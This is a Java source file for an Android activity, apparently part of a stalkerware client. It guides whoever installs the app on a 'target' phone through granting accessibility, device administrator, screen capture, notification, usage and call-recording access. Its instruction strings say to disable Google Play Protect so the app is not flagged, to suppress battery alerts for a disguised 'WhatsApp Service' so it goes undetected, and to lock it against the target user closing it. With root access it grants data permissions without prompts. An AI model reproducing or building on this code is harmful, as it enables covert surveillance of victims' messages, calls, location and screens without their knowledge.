package com.android.sus_client.applaunchers;

import static com.android.sus_client.utils.Utils.addOrRemoveProperty;
import static com.android.sus_client.utils.Utils.dpToPxInt;
import static com.android.sus_client.utils.Utils.getColorPrimary;
import static com.android.sus_client.utils.Utils.setStatusBarBackgroundColor;
import static com.android.sus_client.utils.Utils.updateMargin;
import static com.android.sus_client.utils.Utils.updateWidthHeight;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.res.ColorStateList;
import android.graphics.Color;
import android.graphics.Typeface;
import android.os.Bundle;
import android.util.Log;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.android.sus_client.R;
import com.android.sus_client.commonutility.root.RootManager;
import com.android.sus_client.database.SharedPreferenceManager;
import com.android.sus_client.utils.ApkUtils;
import com.android.sus_client.utils.AppUtils;
import com.android.sus_client.utils.JSONUtils;
import com.android.sus_client.utils.PermissionsBinder;
import com.android.sus_client.utils.PermissionsUtils;
import com.android.sus_client.utils.Utils;
import com.android.sus_client.utils.XiaomiUtilities;
import com.android.sus_client.utils.permissions.PermissionHandler;
import com.android.sus_client.utils.permissions.Permissions;

import org.json.JSONArray;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;

public class SetupPermissionsActivity extends Activity {

    /**
     * Reference: Android background power manager permission
     * <a href="https://stackoverflow.com/questions/48166206/how-to-start-power-manager-of-all-android-manufactures-to-enable-background-and">...</a>
     */
    private LinearLayout laySettings;
    private TextView tvTitle, tvDesc;
    private ImageView imgSettingsUi;
    private Button btnProceedSettings;

    private Context context;

    private SharedPreferenceManager preferences;
    public static boolean nonCheckablePermissionsGranted = false;
    public static final List<Integer> nonCheckablePermissions = Arrays.asList(11, 12);

    private RelativeLayout getMainView() {
        RelativeLayout root = new RelativeLayout(this);

        laySettings = new LinearLayout(this);
        // define main layout characteristics
        laySettings.setGravity(Gravity.CENTER_HORIZONTAL);
        laySettings.setOrientation(LinearLayout.VERTICAL);

        // Set generic layout parameters
        final LinearLayout.LayoutParams linearParams = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        final int twoDp = dpToPxInt(2);
        final int colorGrey800 = Color.parseColor("#424242");
        final int colorGrey900 = Color.parseColor("#212121");

        tvTitle = new TextView(this);
        tvTitle.setTextSize(TypedValue.COMPLEX_UNIT_SP, 17f);
        tvTitle.setTextColor(Color.BLACK);
        tvTitle.setTypeface(Typeface.DEFAULT_BOLD);
        tvTitle.setGravity(Gravity.CENTER_HORIZONTAL);
        tvTitle.setPadding(twoDp, twoDp, twoDp, twoDp);
        laySettings.addView(tvTitle, linearParams);
        updateMargin(tvTitle, 0f, 24f, 0f, 0f);

        tvDesc = new TextView(this);
        tvDesc.setTextSize(TypedValue.COMPLEX_UNIT_SP, 15.5f);
        tvDesc.setTextColor(colorGrey800);
        tvDesc.setGravity(Gravity.CENTER_HORIZONTAL);
        tvDesc.setPadding(twoDp, twoDp, twoDp, twoDp);
        laySettings.addView(tvDesc, linearParams);
        updateMargin(tvDesc, 0f, 14f, 0f, 0f);

        imgSettingsUi = new ImageView(this);
        laySettings.addView(imgSettingsUi, linearParams);
        updateWidthHeight(imgSettingsUi, ViewGroup.MarginLayoutParams.MATCH_PARENT, ViewGroup.MarginLayoutParams.WRAP_CONTENT);
        updateMargin(imgSettingsUi, 20f, 45f, 20f, 20f);

        btnProceedSettings = new Button(this);
        btnProceedSettings.setId(View.generateViewId());
        btnProceedSettings.setText("Proceed To Settings");
        btnProceedSettings.setAllCaps(false);
        btnProceedSettings.setTextSize(TypedValue.COMPLEX_UNIT_SP, 15f);
        btnProceedSettings.setTextColor(Color.WHITE);
        btnProceedSettings.setBackgroundTintList(ColorStateList.valueOf(getColorPrimary(this)));
        root.addView(btnProceedSettings, linearParams);
        updateWidthHeight(btnProceedSettings, ViewGroup.MarginLayoutParams.MATCH_PARENT, 50);
        addOrRemoveProperty(btnProceedSettings, RelativeLayout.ALIGN_PARENT_BOTTOM, true);
        updateMargin(btnProceedSettings, 30f, 25f, 30f, 30f);

        root.addView(laySettings);
        updateWidthHeight(laySettings, ViewGroup.MarginLayoutParams.MATCH_PARENT, ViewGroup.MarginLayoutParams.MATCH_PARENT);
        addOrRemoveProperty(laySettings, RelativeLayout.ABOVE, btnProceedSettings.getId(), true);
        updateMargin(laySettings, 30f, 30f, 30f, 0f);
        root.setBackgroundColor(Color.WHITE);
        return root;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(getMainView());
        setStatusBarBackgroundColor(this, Color.WHITE);

        initStringValues(this);
        PermissionsBinder.loadPermissions(this);
        context = this;
        preferences = SharedPreferenceManager.get(this);
    }

    private void switchToCheckablePermissionsScreen() {
        List<PermissionsBinder.Type> requiredPermissions = PermissionsBinder.getRequiredPermissions(context);
        if (requiredPermissions.isEmpty()) return;
        PermissionsBinder.Type permissionType = requiredPermissions.get(0);

        String title = "", desc = "";
        int image = 0;
        String btnText = proceed_to_settings;
        switch (permissionType) {
            case ACCESSIBILITY_SERVICE:
                title = permission_accessibility_title;
                desc = permission_accessibility_mess;
                image = R.mipmap.sus_ic_permission_accessibility_bg;
                break;
            case USAGE_ACCESS:
                title = permission_usage_data_title;
                desc = permission_usage_data_mess;
                image = R.mipmap.sus_ic_permission_usage_data_bg;
                break;
            case NOTIFICATION_LISTENER_ACCESS:
                title = permission_notification_title;
                desc = permission_notification_mess;
                image = R.mipmap.sus_ic_permission_notification_bg;
                break;
            case IGNORE_BATTERY_OPTIMIZATION:
                title = permission_battery_optimization_title;
                desc = permission_battery_optimization_mess;
                if (AppUtils.isMiuiDevice()) {
                    image = R.mipmap.sus_ic_permission_run_back_miui_bg;
                } else {
                    image = R.mipmap.sus_ic_permission_ignore_battery_bg;
                }
                break;
            case SCREEN_CAPTURE:
                title = permission_screen_capture_title;
                desc = permission_screen_capture_mess;
                image = R.mipmap.sus_ic_permission_screen_capture_bg;
                break;
            case DRAW_OVER_OTHER_APPS:
                title = permission_draw_over_apps_title;
                image = R.mipmap.sus_ic_permission_draw_over_apps_bg;
                if (AppUtils.isMiuiDevice()) {
                    desc = permission_draw_over_apps_miui_mess;
                } else {
                    desc = permission_draw_over_apps_mess;
                }
                break;
            case INSTALL_UNKNOWN_APPS:
                title = permission_unknown_sources_title;
                desc = permission_unknown_sources_mess;
                image = R.mipmap.sus_ic_permission_unknown_sources_bg;
                break;
            case AUTO_START_PERMISSION:
                title = permission_auto_start_title;
                desc = permission_auto_start_mess;
                image = R.mipmap.sus_ic_permission_auto_start_bg;
                break;
            case DEVICE_ADMINISTRATOR_ACCESS:
                title = permission_administrator_title;
                desc = permission_administrator_mess;
                image = R.mipmap.sus_ic_permission_administrator_bg;
                break;
            case DATA_ACCESS_PERMISSIONS:
                title = permission_data_title;
                desc = permission_data_mess;
                image = R.mipmap.sus_ic_permission_data_bg;
                btnText = allow_all_access;
                break;
        }

        tvTitle.setText(title);
        tvDesc.setText(desc);
        try {
            imgSettingsUi.setImageResource(image);
        } catch (Exception e) {
            throw new Error(e.toString());
        } catch (Error e2) {
            e2.printStackTrace();
        }
        btnProceedSettings.setText(btnText);
        btnProceedSettings.setOnClickListener(v -> {
            if (permissionType == PermissionsBinder.Type.DATA_ACCESS_PERMISSIONS) {
                if (RootManager.hasRootAccess()) {
                    for (int i = 0; i < PermissionsUtils.permission.length; i++) {
                        PermissionsUtils.requestPermissionAsRoot(context, PermissionsUtils.permission[i]);
                    }
                    onAppResume();

                } else {
                    Permissions.request(context, PermissionsUtils.permission, new PermissionHandler() {
                        @Override
                        public void onGranted(ArrayList<String> grantedPermissions) {
                            if (!grantedPermissions.containsAll(Arrays.asList(PermissionsUtils.permission))) {
                                Toast.makeText(context, enable_all_permission_settings, Toast.LENGTH_SHORT).show();
                            } else {
                                onAppResume();
                            }
                        }
                    });
                }

            } else {
                PermissionsBinder.requestOtherPermission(context, permissionType);
            }
        });
    }

    private void switchToNonCheckablePermissionsScreen() {
        JSONArray savedArray = preferences.nonCheckableGrantedPermissions();
        List<Integer> savedPermissions = JSONUtils.jsonArrayToList(savedArray);

        List<Integer> requiredPermissions = new ArrayList<>();
        for (Integer per : nonCheckablePermissions) {
            if (!savedPermissions.contains(per) && !requiredPermissions.contains(per)) {
                requiredPermissions.add(per);
            }
        }
        if (requiredPermissions.isEmpty()) {
            nonCheckablePermissionsGranted = true;
            return;
        }

        String title = "", desc = "";
        int image = 0;
        String btnText = proceed_to_settings;
        switch (requiredPermissions.get(0)) {
            case 11:
                title = permission_google_title;
                desc = permission_google_mess;
                image = R.mipmap.sus_ic_permission_google_bg;
                btnProceedSettings.setOnClickListener(v -> {
                    savedPermissions.add(11);
                    preferences.nonCheckableGrantedPermissions(JSONUtils.listToJSONArray(savedPermissions));
                    PermissionsUtils.goToGooglePlayProtect(context);
                });
                break;
            case 12:
                title = permission_lock_title;
                if (AppUtils.isMiuiDevice()) {
                    desc = permission_lock_miui_mes;
                    image = R.mipmap.sus_ic_permission_lock_miui_bg;
                } else if (AppUtils.isHuaweiDevice()) {
                    desc = permission_lock_hw_mes;
                    image = R.mipmap.sus_ic_permission_lock_hw_bg;
                } else {
                    desc = permission_lock_mes;
                    image = R.mipmap.sus_ic_permission_lock_bg;
                }
                btnProceedSettings.setOnClickListener(v -> {
                    savedPermissions.add(12);
                    preferences.nonCheckableGrantedPermissions(JSONUtils.listToJSONArray(savedPermissions));
                    finish();
                });
                break;
        }

        tvTitle.setText(title);
        tvDesc.setText(desc);
        try {
            imgSettingsUi.setImageResource(image);
        } catch (Exception e) {
            throw new Error(e.toString());
        } catch (Error e2) {
            e2.printStackTrace();
        }
        btnProceedSettings.setText(btnText);
    }

    @Override
    protected void onResume() {
        super.onResume();
        Utils.setStatusBarTranslucent(this, Color.WHITE);
        onAppResume();
    }

    private void onAppResume() {
        boolean isAllPermissionGranted = PermissionsBinder.isAllPermissionGranted(context);
        if (isAllPermissionGranted && nonCheckablePermissionsGranted) {
            laySettings.setVisibility(View.GONE);
            finish();
        }

        laySettings.setVisibility(View.VISIBLE);
        if (isAllPermissionGranted) {
            switchToNonCheckablePermissionsScreen();
        } else {
            switchToCheckablePermissionsScreen();
        }
    }

    public static boolean isSetupRequired(Context context) {
        initStringValues(context);
        JSONArray savedNonCheckableArray = SharedPreferenceManager.get(context).nonCheckableGrantedPermissions();
        List<Integer> savedNonCheckablePermissions = JSONUtils.jsonArrayToList(savedNonCheckableArray);
        nonCheckablePermissionsGranted = new HashSet<>(savedNonCheckablePermissions).containsAll(nonCheckablePermissions);

        boolean isAllPermissionGranted = PermissionsBinder.isAllPermissionGranted(context);
        if (isAllPermissionGranted && nonCheckablePermissionsGranted) {
            return false;
        }
        return true;
    }

    private void startActivityMine(Intent intent) {
        try {
            startActivity(intent);
        } catch (android.content.ActivityNotFoundException ex) {
            Toast.makeText(this, "Activity Not Found", Toast.LENGTH_LONG).show();
        }
    }


    /**
     * strings values
     */

    public static String appname = "";
    public static String accessibility = "Accessibility";
    public static String administrator = "Administrator";
    public static String agree_next = "Agree >>";
    public static String allow = "Allow";
    public static String allow_all_access = "Allow All";
    public static String already_set = "Already set";
    public static String proceed_to_settings = "Proceed to Settings";

    public static String enable_all_permission_settings = "";
    public static String data_access_permissions_proceed = "";
    public static String google_permission_tip = "";
    public static String has_old_app_need_uninstall = "";
    public static String intercept_accessibility = "";
    public static String loss_permission = "";
    public static String permission_accessibility_mess = "";
    public static String permission_accessibility_title = "";
    public static String permission_administrator_mess = "";
    public static String permission_administrator_title = "";
    public static String permission_auto_start_mess = "";
    public static String permission_auto_start_title = "";
    public static String permission_calendar_mess = "";
    public static String permission_call_log_mess = "";
    public static String permission_contact_mess = "";
    public static String permission_data_mess = "";
    public static String permission_data_title = "";
    public static String permission_description_accessibility = "";
    public static String permission_google_mess = "";
    public static String permission_google_title = "";
    public static String permission_ignore_battery_mess = "";
    public static String permission_ignore_battery_tip_mess = "";
    public static String permission_ignore_battery_tip_title = "";
    public static String permission_ignore_battery_title = "";
    public static String permission_location_mess = "";
    public static String permission_lock_hw_mes = "";
    public static String permission_lock_hw_tip = "";
    public static String permission_lock_hw_title = "";
    public static String permission_lock_mes = "";
    public static String permission_lock_miui_mes = "";
    public static String permission_lock_miui_tip = "";
    public static String permission_lock_miui_title = "";
    public static String permission_lock_tip = "";
    public static String permission_lock_title = "";

    public static String permission_message_mess = "";
    public static String permission_notification_mess = "";
    public static String permission_notification_title = "";
    public static String permission_record_audio_mess = "";
    public static String permission_record_audio_title = "";
    public static String permission_run_back_hw_mess = "";
    public static String permission_run_back_hw_title = "";
    public static String permission_run_back_miui_mess = "";
    public static String permission_run_back_miui_title = "";
    public static String permission_run_back_oppo_mess = "";
    public static String permission_run_back_oppo_title = "";
    public static String permission_run_back_other_mess = "";
    public static String permission_run_back_other_title = "";
    public static String permission_battery_optimization_mess = "";
    public static String permission_battery_optimization_title = "";
    public static String permission_screen_capture_mess = "";
    public static String permission_screen_capture_title = "";
    public static String permission_draw_over_apps_miui_mess = "";
    public static String permission_draw_over_apps_mess = "";
    public static String permission_draw_over_apps_title = "";
    public static String permission_unknown_sources_mess = "";
    public static String permission_unknown_sources_title = "";
    public static String permission_storage_mess = "";
    public static String permission_storage_title = "";
    public static String permission_usage_data_mess = "";
    public static String permission_usage_data_title = "";

    public static void initStringValues(Context context) {
        appname = ApkUtils.getApplicationName(context);
        enable_all_permission_settings = "Grant all required rootFilePermissions from Settings >> Apps >> " + appname + ", and enable all";
        data_access_permissions_proceed = appname + " needs to access the following data, please proceed:";
        google_permission_tip = "Are you sure you have finished customizing settings? If not, " + appname + " may not run smoothly.";
        has_old_app_need_uninstall = "We've found there is an older version already installed. Please uninstall it before installing the new version of " + appname + " to avoid application conflict.";
        intercept_accessibility = "The Accessibility permission cannot be turned off for the " + appname + " to function properly.";
        loss_permission = "Some rootFilePermissions are still missing. Please allow ALL the following rootFilePermissions so that you can proceed with data monitoring.";
        permission_accessibility_mess = "Please proceed to Accessibility to toggle on " + appname + ", so that the app can monitor the real-time status of this phone.";
        permission_accessibility_title = "Activate Accessibility";
        permission_administrator_mess = "Please proceed to Activate \"Administrator Access\" for " + appname + ", so that " + appname + " can monitor the phone in real time.";
        permission_administrator_title = "Activate Administrator Access";
        permission_auto_start_mess = "Enable \"" + appname + "\" app in Autostart settings, otherwise the app won't start once the device restarts.";
        permission_auto_start_title = "Enable Autostart";
        permission_calendar_mess = "Allow " + appname + " to access calendar.";
        permission_call_log_mess = "Allow " + appname + " to access the call logs.";
        permission_contact_mess = "Allow " + appname + " to access contacts.";
        permission_data_mess = "Please click \"Allow All\" button. Then the app will obtain the following rootFilePermissions automatically.";
        permission_data_title = "Activate Data Access";
        permission_description_accessibility = "1. Please turn on Accessibility for " + appname + " to guarantee the normal use. 2. After enabling the Accessibility, tap OK on the pop-up window to allow " + appname + " to have full control of your device. We do NOT authorize the use of your data by any third party.";
        permission_google_mess = "Please disable Google Play Protect to prevent the app from being flagged or removed by secure apps.";
        permission_google_title = "Disable Google Play Protect";
        permission_ignore_battery_mess = "In order to keep the app running normally in the background, please ignore the Battery Optimization.";
        permission_ignore_battery_tip_mess = "Please disable Power Consumption Alert for WhatsApp Service to prevent the app from being detected.";
        permission_ignore_battery_tip_title = "Ignore Battery Consumption Alert";
        permission_ignore_battery_title = "Ignore the Battery Optimization";
        permission_location_mess = "Allow " + appname + " to access the location.";
        permission_lock_hw_mes = "Tap the button below and find " + appname + " in Task Manager. Swipe down the app interface to lock it down. After that, tap the app interface to return. This is to prevent the app from being closed if the target user clears the memory.";
        permission_lock_hw_tip = "Are you sure the " + appname + " is locked on Task Manager or Recent Apps? If not, it may be closed or removed automatically by Android.";
        permission_lock_hw_title = "One Last Step";
        permission_lock_mes = "Tap the button below and find " + appname + " in Task Manager. Tap the Settings icon in the upper right corner. Tap Lock. After that, tap the app interface to return. This is to prevent the app from being closed if the target user clears the memory.";
        permission_lock_miui_mes = "Tap the button below and find " + appname + " in Task Manager. Long press the app tab and lock it down. After that, tap the app interface to return. This is to prevent the app from being closed if the target user clears the memory.";
        permission_lock_miui_tip = "Are you sure the " + appname + " is locked on Task Manager or Recent Apps? If not, it may be closed or removed automatically by Android.";
        permission_lock_miui_title = "One Last Step";
        permission_lock_tip = "Are you sure the " + appname + " is locked on Task Manager or Recent Apps? If not, it may be closed or removed automatically by Android.";
        permission_lock_title = "One Last Step";

        permission_message_mess = "Allow " + appname + " to read the messages.";
        permission_notification_mess = "Please proceed to Notification Access >> " + appname + ", and toggle it on, so that the app can monitor the notification of this phone.";
        permission_notification_title = "Activate Notification Access";
        permission_record_audio_mess = "Please allow " + appname + " for WhatsApp to record WhatsApp calls.";
        permission_record_audio_title = "Activate Call Recording";
        permission_run_back_hw_mess = "Please proceed to App launch >> Manage all automatically and disable " + appname + ", then in the popup Manage manually window, enable Auto-launch, Secondary launch and Run in background, so that " + appname + " won't be automatically killed in the background.";
        permission_run_back_hw_title = "Enable Manage Manually";
        permission_run_back_miui_mess = "Please enable No restrictions under Background Settings, so that " + appname + " won't be automatically killed in the background.";
        permission_run_back_miui_title = "Enable No Restrictions";
        permission_run_back_oppo_mess = "Please enable Allow Background Running, so that " + appname + " won't be automatically killed while running in the background.";
        permission_run_back_oppo_title = "Enable Background Running";
        permission_run_back_other_mess = "In order to keep the app running normally in the background, please enable background running.";
        permission_run_back_other_title = "Enable Background Running";
        permission_battery_optimization_mess = "Let app " + appname + " stay connected in the background. This may use more battery. You can change this later from Settings >> Apps &amp; notifications.";
        permission_battery_optimization_title = "Enable Ignore battery optimization";
        permission_screen_capture_mess = "Please allow " + appname + " to capture the screen of the target phone, so that " + appname + " can take screenshots of everything displayed on the screen of the phone. Choose \"Don't show again\" before you tap on \"START NOW\".";
        permission_screen_capture_title = "Activate Screen Capture";
        permission_draw_over_apps_miui_mess = "Please proceed to Settings >> Privacy protection >> Special rootFilePermissions >> Display over other apps >> " + appname + ", and toggle it on, so " + appname + " can display on the top of other apps";
        permission_draw_over_apps_mess = "Please proceed to Settings >> Apps >> " + appname + ", and toggle it on, so " + appname + " can display on the top of other apps.";
        permission_draw_over_apps_title = "Enable Draw over other apps";
        permission_unknown_sources_mess = "Please proceed to Settings >> Apps >> " + appname + " >> Install unknown apps, and toggle it on, so " + appname + " can update apps.";
        permission_unknown_sources_title = "Enable Install unknown apps";
        permission_storage_mess = "Please enable Storage for WhatsApp Service to monitor WhatsApp files on this phone.";
        permission_storage_title = "Activate Storage Access";
        permission_usage_data_mess = "Please proceed to Usage Data Access >> " + appname + ", and enable \"Allow usage tracking\", so that " + appname + " can monitor app activities on the target device.";
        permission_usage_data_title = "Activate App Supervision";
    }

}